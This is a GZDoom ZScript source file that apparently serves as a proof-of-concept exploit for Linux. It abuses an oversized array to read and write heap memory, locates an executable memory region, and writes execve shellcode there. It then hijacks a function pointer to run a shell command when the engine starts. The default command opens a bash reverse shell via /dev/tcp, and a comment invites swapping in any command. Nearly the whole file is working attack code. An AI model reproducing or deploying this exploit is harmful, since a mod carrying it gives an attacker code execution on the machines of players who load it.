version "4.13"

class WeirdObject
{
	// NOTE: The first member starts at offset 0x28. Probably what's before it are inherited members.
	//       On the debug build, it actually starts at 0x30, implying 8 bytes' worth of members have been added.

	uint one;	// Nothing wrong with me.
	uint two;	// Nothing wrong with me.
	uint three;	// Nothing wrong with me!
	uint four;	// NOTHING WRONG WITH ME!
	Function<clearscope void()> funcptr;	// Something's got to give!
}

class EEEEVILLLLEventHandler : StaticEventHandler
{
	String szShellCmd;

	void Status(String szMsg)
	{
		Console.Printf("\034V[*] %s\034J", szMsg);
	}

	void Success(String szMsg)
	{
		Console.Printf("\034D[+] %s\034J", szMsg);
	}

	void ErrorOrWarning(String szMsg)
	{
		Console.Printf("\034G[x] %s\034J", szMsg);
	}

	override void OnEngineInitialize()
	{
		uint i;
		uint u32RWX_L;
		uint u32RWX_H;
		uint u32FoundSomething;
		uint u32ShellcodeAddr_L;
		uint u32ShellcodeAddr_H;
		uint u32CurWord;
		uint u32NumCharsToCopy;
		uint u32Reserved6;
		uint u32Reserved7;
		uint u32Reserved8;

		Console.Printf("\n");
		Status("Let's rock, baby!");
		Status("NOTE: This PoC only works on Linux!");

		// Replace this with the shell command you want to execute!
		// By default, this spawns a reverse shell, connecting back to localhost on port 1337.
		szShellCmd = "/bin/bash -i >& /dev/tcp/localhost/1337 0>&1 &";
		Status("The command you intend to execute is:");
		COnsole.Printf("\t%s", szShellCmd);

		// Start by allocating a huge-ass array. It's store on the heap.
		// These are 32-bit words, so this is enough to address about 4 GiB of memory.
		// Obviously we won't be able to read all of it; when this script runs, the heap will be only 16 MiB large.
		// But that's more than enough for what we're looking to do.
		uint u32pBFA9000[1073741823];
		u32pBFA9000[0] = 0xA5A5A5A5;	// To visually identify the array start in memory dumps.

		// Used to search for offsets known to be in the RWX region. Run with ASLR disabled!
		// Known possible ranges of RWX maps (on my machine at least):
		//	0x7ffff2f00000 - 0x7ffff3000000
		//	0x7ffff3900000 - 0x7ffff3a00000
		//	0x7ffff4300000 - 0x7ffff4400000
		// To find where the possible RWX regions are when ASLR's disabled, cat /proc/<gzdoom-pid>/maps and grep for "rwx".
		/*Status("Finding candidates of offsets known to be in the RWX region (will not work if ASLR's enabled)...");
		for (i = 0; i < (1073741823 / 2); i += 2)
		{
			u32RWX_L = u32pBFA9000[i];
			u32RWX_H = u32pBFA9000[i+1];

			if ((u32RWX_H & 0xffff8000) == 0)
			{
				if ((u32RWX_L & 0xffe00000) == 0xf2e00000)
				{
					Console.Printf("0x%x%08x", u32RWX_H, u32RWX_L);
				}
				if ((u32RWX_L & 0xffe00000) == 0xf3800000)
				{
					Console.Printf("0x%x%08x", u32RWX_H, u32RWX_L);
				}
				if ((u32RWX_L & 0xffe00000) == 0xf4200000)
				{
					Console.Printf("0x%x%08x", u32RWX_H, u32RWX_L);
				}
			}
		}
		ErrorOrWarning("Infinite loop of death!");
		for (i = 0; i < 1; i = 0) {};*/

		// Locate the RWX region's address by scanning the heap and comparing each low half of a qword against a known offset.
		// Relying on the memory allocator to place sensitive values on the heap predictably is a fool's errand.
		// We don't know what an RWX region looks like, but we do know offsets within it and the fact that it's somewhere high.
		// ZScript is compiled deterministically on a single thread (I think, didn't check), so offsets shouldn't change.
		// Stop on the first match found, otherwise we'll go too far and read memory we're not supposed to read.
		Status("Finding RWX region's address...");
		for (i = 0; i < (1073741823 / 2); i += 2)
		{
			u32RWX_L = u32pBFA9000[i];
			u32RWX_H = u32pBFA9000[i+1];

			// Make sure this is indeed an address and not just some data that happens to have the same lower bits.
			if ((u32RWX_H & 0xffff8000) == 0)
			{
				// Check the value, branch-by-branch. I didn't want to use a for loop and array of integers for fear
				// of compiler optimization changing the execution/compilation logic in a way I didn't want.
				u32FoundSomething = 0;
				if ((u32RWX_L & 0x001fffff) == 0x1aed58) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1aed58; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cc518) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cc518; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1ccb24) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1ccb24; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1ccd08) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1ccd08; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cd01c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cd01c; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cd978) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cd978; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cdbd4) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cdbd4; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1ce5f0) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1ce5f0; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cef0c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cef0c; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cf830) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cf830; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1cfd7c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1cfd7c; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x14c300) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x14c300; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x14c534) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x14c534; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x14c658) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x14c658; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x14c87c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x14c87c; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x14cbb0) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x14cbb0; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1661b4) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1661b4; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x166a20) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x166a20; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x166f34) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x166f34; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x167088) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x167088; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x16715c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x16715c; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1f6c1c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1f6c1c; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1fe8df) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1fe8df; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x10037f) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x10037f; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1008cb) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1008cb; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x100cff) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x100cff; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x101573) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x101573; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x101d8f) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x101d8f; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1024f3) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1024f3; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x102bdf) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x102bdf; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x10370b) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x10370b; u32FoundSomething = 1; }
				if ((u32RWX_L & 0x001fffff) == 0x1f845c) { Console.Printf("\t0x%08x%08x", u32RWX_H, u32RWX_L); u32RWX_L -= 0x1f845c; u32FoundSomething = 1; }

				// Stop if we found something, but only if it's plausibly a non-heap/non-program address.
				if (u32FoundSomething)
				{
					// NOTE: Sometimes this can start at or after 0x56000000.
					if (u32RWX_H > 0x00005600)
						break;
					else
						ErrorOrWarning("Nope...");
				}
			}
			else
			{
				u32RWX_L = 0;
				u32RWX_H = 0;
			}
		}
		if (u32RWX_L == 0 && u32RWX_H == 0)
		{
			// 100% certain this'll never happen.
			ErrorOrWarning("Came out empty handed!");
			return;
		}
		u32RWX_L += 0x180000;	// Here's hoping it doesn't overflow...
		Success("Found something!");
		Console.Printf("\t0x%x%08x", u32RWX_H, u32RWX_L);
		u32ShellcodeAddr_L = u32RWX_L + 0x2000;
		u32ShellcodeAddr_H = u32RWX_H;
		Status("Shellcode will be placed at:");
		Console.Printf("\t0x%x%08x", u32ShellcodeAddr_H, u32ShellcodeAddr_L);

		// Allocate an array of pointers and, using a for loop with 2 objects to avoid optimization, modify the first one.
		// The compiler doesn't realize it, but ppGadgetObjects and u32pBFA9000 overlap at exactly the same start addresses!
		// The pointer will point to the RWX region where we'll write the shellcode, and we'll write it.
		// NOTE: Might not need the for loop, but in my test code I did it with one and it worked well.
		Status("Creating gadget objects...");
		WeirdObject ppGadgetObjects[2];
		ppGadgetObjects[0] = New("WeirdObject");	// Arbitrary write pointer.
		ppGadgetObjects[1] = New("WeirdObject");	// Arbitrary execute object.
		Success("Done!");

		// Using our arbitrary write primitive, prepare our arbitrary execute primitive.
		// NOTE: The offsets are different for debug and release builds.
		Status("Preparing arbitrary execute...");
		// The target value points to... well, I'm not sure. It's a struct of some kind.
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x40 - 8;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x100;
		ppGadgetObjects[0].two = u32RWX_H;
		// The target value points to a VMFunction.
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x100 + 8;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x200;
		ppGadgetObjects[0].two = u32RWX_H;
		// At (target_value + 0xc) is VMFunction.VarFlags.
		// Set it to all-zeros so that VARF_Native is unset, leading to a simpler function call.
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x200 + 0xc;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = 0x00000000;
		ppGadgetObjects[0].two = 0x00000000;
		// At (target_value + 0x58) is the pointer to the function to be called!
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x200 + 0x58;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32ShellcodeAddr_L;
		ppGadgetObjects[0].two = u32ShellcodeAddr_H;
		// Just gonna put some invalid opcodes at the shellcode address for now.
		// It helps with testing the shellcode to make sure the regs are correct.
		for (i = 0; i < 256; i += 0x10)
		{
			u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + i;
			u32pBFA9000[1] = u32ShellcodeAddr_H;
			ppGadgetObjects[0].one = 0x0B0F0B0F;
			ppGadgetObjects[0].two = 0x0B0F0B0F;
			ppGadgetObjects[0].three = 0x0B0F0B0F;
			ppGadgetObjects[0].four = 0x0B0F0B0F;
		}
		// Now we overwrite ppGadgetObjects[1].funcptr!
		ppGadgetObjects[1].funcptr = Console.HideConsole;
		u32pBFA9000[2] += 16;	// Skip the first 4 members, point to the pointer member.
		ppGadgetObjects[1].one = u32RWX_L;
		ppGadgetObjects[1].two = u32RWX_H;
		u32pBFA9000[2] -= 16;	// Revert it so we can make the call.
		// That's it! We just call ppGadgetObjects[1].funcptr when we're ready to rock.
		Success("Done!");
		// Uncomment to test calling the malicious pointer.
		// If successful, the program should crash due to an illegal instruction error.
		//ppGadgetObjects[1].funcptr.call();

		// Now to write our shellcode and the data it needs.

		// The data to write and their offsets relative to the RWX region's start address are:
		/*
			0x1fe0 - pointer to "/bin/bash" (rwx + 0x4000)
			0x1fe8 - pointer to argv (rwx + 0x4300)
			0x1ff0 - pointer to envp
			0x2000 - shellcode
			0x4000 - "/bin/bash" + null terminator
			0x4100 - "-c" + null terminator
			0x4200 - command to execute + null terminator
			0x4300 - (start of argv) pointer to "/bin/bash" (rwx + 0x4000)
			0x4308 - pointer to "-c" (rwx + 0x4100)
			0x4310 - ponter to the command to execute (rwx + 0x4200)
			0x4318 - (end of argv, start of envp) NULL
		*/
		// Let's get the strings out of the way first.
		Status("Creating strings in RWX region...");
		// "/bin/bash" @ 0x4000
		Status("\"/bin/bash\" @ 0x4000");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4000;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = 0x6e69622f;	// /bin
		ppGadgetObjects[0].two = 0x7361622f;	// /bas
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4000 + 8;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = 0x00000068;	// h[NULL]
		// "-c" @ 0x4100
		Status("\"-c\" @ 0x4100");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4100;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = 0x0000632d;	// -c[NULL]
		// szShellCmd @ 0x4200
		Status("your command @ 0x4200");
		for (i = 0; i < szShellCmd.Length(); i += 4)
		{
			u32NumCharsToCopy = szShellCmd.Length() - i;
			if (u32NumCharsToCopy > 4)
				u32NumCharsToCopy = 4;
			u32CurWord = 0;
			if (u32NumCharsToCopy == 4)
				u32CurWord |= ((uint)(szShellCmd.ByteAt(i+3)) << 24);
			if (u32NumCharsToCopy >= 3)
				u32CurWord |= ((uint)(szShellCmd.ByteAt(i+2)) << 16);
			if (u32NumCharsToCopy >= 2)
				u32CurWord |= ((uint)(szShellCmd.ByteAt(i+1)) << 8);
			u32CurWord |= (uint)(szShellCmd.ByteAt(i));

			u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4200 + i;
			u32pBFA9000[1] = u32RWX_H;
			ppGadgetObjects[0].one = u32CurWord;
		}
		Success("Done!");
		// Now let's do argv and envp.
		// argv = { "/bin/bash", "-c", "your-command-here" }
		// envp = { NULL }
		Status("Creating argv and envp...");
		// pointer to "/bin/bash" @ 0x4300
		Status("pointer to \"/bin/bash\" @ 0x4300");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4300 + 0;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x4000;
		ppGadgetObjects[0].two = u32RWX_H;
		// pointer to "-c" @ 0x4308
		Status("pointer to \"-c\" @ 0x4308");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4300 + 8;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x4100;
		ppGadgetObjects[0].two = u32RWX_H;
		// pointer to the command to execute @ 0x4310
		Status("pointer to your command string @ 0x4310");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4300 + 16;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x4200;
		ppGadgetObjects[0].two = u32RWX_H;
		// NULL @ 0x4318
		Status("NULL @ 0x4310");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x4300 + 24;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = 0x00000000;
		ppGadgetObjects[0].two = 0x00000000;
		Success("Done!");
		// Finally, the pointers that execve will use.
		Status("Creating pointers to be passed to execve...");
		// pointer to "/bin/bash" @ 0x1fe0
		Status("pointer to \"/bin/bash\" @ 0x1fe0");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x1fe0 + 0;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x4000;
		ppGadgetObjects[0].two = u32RWX_H;
		// pointer to argv @ 0x1fe8
		Status("pointer to argv @ 0x1fe8");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x1fe0 + 8;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x4300;
		ppGadgetObjects[0].two = u32RWX_H;
		// pointer to envp @ 0x1ff0
		Status("pointer to envp @ 0x1ff0");
		u32pBFA9000[0] = (u32RWX_L-0x28) + 0x1fe0 + 16;
		u32pBFA9000[1] = u32RWX_H;
		ppGadgetObjects[0].one = u32RWX_L + 0x4318;
		ppGadgetObjects[0].two = u32RWX_H;
		Success("Done!");

		// And finally, the shellcode.
		// Used this for assembling, big thanks to its creators:
		//	https://defuse.ca/online-x86-assembler.htm
		// The shellcode in assembly:
		/*
			0:  4c 8d 05 00 00 00 00    lea    r8,[rip+0x0]        # 7 <_main+0x7>
			7:  49 83 e8 07             sub    r8,0x7
			b:  4d 89 c1                mov    r9,r8
			e:  49 83 e9 20             sub    r9,0x20
			12: 49 8b 39                mov    rdi,QWORD PTR [r9]
			15: 4d 89 c1                mov    r9,r8
			18: 49 83 e9 18             sub    r9,0x18
			1c: 49 8b 31                mov    rsi,QWORD PTR [r9]
			1f: 4d 89 c1                mov    r9,r8
			22: 49 83 e9 10             sub    r9,0x10
			26: 49 8b 11                mov    rdx,QWORD PTR [r9]
			29: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
			30: 0f 05                   syscall
		*/
		Status("Writing shellcode...");
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 0;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x00058D4C;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 4;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x49000000;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 8;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x4D07E883;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 12;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x8349C189;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 16;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x8B4920E9;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 20;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0xC1894D39;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 24;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x18E98349;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 28;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x4D318B49;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 32;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x8349C189;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 36;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x8B4910E9;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 40;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0xC0C74811;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 44;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x0000003B;
		u32pBFA9000[0] = (u32ShellcodeAddr_L-0x28) + 48;
		u32pBFA9000[1] = u32ShellcodeAddr_H;
		ppGadgetObjects[0].one = 0x0000050f;
		Success("Done!");

		// Now run the code!
		Success("Game over!");
		ppGadgetObjects[1].funcptr.call();
	}
}
